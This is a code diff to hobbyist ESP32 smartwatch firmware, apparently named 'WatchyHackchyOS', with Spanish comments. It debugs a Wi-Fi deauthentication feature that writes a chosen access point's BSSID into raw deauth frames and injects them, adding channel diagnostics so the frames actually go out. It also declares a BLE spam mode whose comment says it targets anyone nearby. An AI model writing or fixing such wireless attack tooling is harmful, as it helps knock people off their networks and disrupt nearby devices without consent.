@@ -84,6 +84,8 @@ RTC_DATA_ATTR bool     deauthRunning = false;
 RTC_DATA_ATTR uint32_t deauthSent    = 0;      // tramas enviadas en esta sesión
 RTC_DATA_ATTR int32_t  deauthLeft    = 0;      // segundos hasta el autocorte
 RTC_DATA_ATTR int32_t  deauthLastErr = 0;      // último esp_err_t de esp_wifi_80211_tx (diagnóstico)
+RTC_DATA_ATTR int32_t  deauthChanErr = 0;      // retorno de esp_wifi_set_channel (diagnóstico)
+RTC_DATA_ATTR uint8_t  deauthRealChan = 0;     // canal que el radio dice tener activo (diagnóstico)
 
 // Spam BLE: anuncios falsos (sin objetivo, afecta a cualquiera que esté cerca)
 RTC_DATA_ATTR int      bleSpamMode    = 0;      // plantilla elegida (ver BLESPAM_NAMES)
@@ -205,7 +207,9 @@ void WatchyHackchyOS::deauthBurst() {
   const uint8_t *bssid = wifiBSSID[deauthSel];
   memcpy(deauthFrame + 10, bssid, 6);
   memcpy(deauthFrame + 16, bssid, 6);
-  esp_wifi_set_channel(wifiChan[deauthSel], WIFI_SECOND_CHAN_NONE);
+  deauthChanErr = (int32_t)esp_wifi_set_channel(wifiChan[deauthSel], WIFI_SECOND_CHAN_NONE);
+  wifi_second_chan_t secondChan;             // solo para rellenar el parámetro; no se usa
+  esp_wifi_get_channel(&deauthRealChan, &secondChan);
   for (int i = 0; i < 10; i++) {
     // en_sys_seq = true: en IDF 5.x (core ESP32 3.x), si la interfaz ya está
     // levantada y se pasa false, esp_wifi_80211_tx devuelve ESP_ERR_INVALID_ARG
@@ -219,7 +223,6 @@ void WatchyHackchyOS::deauthBurst() {
 
 void WatchyHackchyOS::stopDeauth() {
   deauthRunning = false;
-  esp_wifi_set_promiscuous(false);
   WiFi.mode(WIFI_OFF);
 }
 
@@ -577,11 +580,6 @@ void WatchyHackchyOS::openApp(AppId id) {
       // el radio entre operaciones: esp_wifi_80211_tx() puede devolver ESP_OK
       // sin que la trama llegue a salir por el aire. Imprescindible para TX.
       esp_wifi_set_ps(WIFI_PS_NONE);
-      // DIAGNÓSTICO: ESP_ERR_INVALID_ARG persiste en esp_wifi_80211_tx() pase
-      // lo que pase en la trama; probamos si el driver exige promiscuo activo
-      // para inyectar (la única diferencia estructural con el monitor, que sí
-      // transmite/recibe sin problema). Quitar si no cambia el error.
-      esp_wifi_set_promiscuous(true);
       break;
     case APP_BLESPAM:
       // nunca empieza a transmitir sola, hay que armarla con MENU
@@ -928,7 +926,7 @@ void WatchyHackchyOS::drawDeauth() {
   centerText(100, 80, meta);
 
   // estado: armado/transmitiendo o en reposo
-  panel(L, 102, R, 170);
+  panel(L, 102, R, 178);
   if (deauthRunning) {
     display.fillRect(L + 2, 104, R - L - 4, 23, fg());
     display.setTextColor(bg());
@@ -941,8 +939,14 @@ void WatchyHackchyOS::drawDeauth() {
              (unsigned long)deauthSent, (long)deauthLeft);
     centerText(100, 140, st);
     if (deauthSent == 0) {                   // diagnóstico: por qué no sale nada
-      char err[24]; snprintf(err, sizeof(err), "err esp_wifi: 0x%lx", (long)deauthLastErr);
-      centerText(100, 154, err);
+      char err[28];
+      snprintf(err, sizeof(err), "tx:0x%lx chSet:0x%lx",
+               (long)deauthLastErr, (long)deauthChanErr);
+      centerText(100, 152, err);
+      char chn[20];
+      snprintf(chn, sizeof(chn), "ch pedido %d real %d",
+               wifiChan[deauthSel], deauthRealChan);
+      centerText(100, 164, chn);
     }
   } else {
     title(L + 6, 102, "estado");
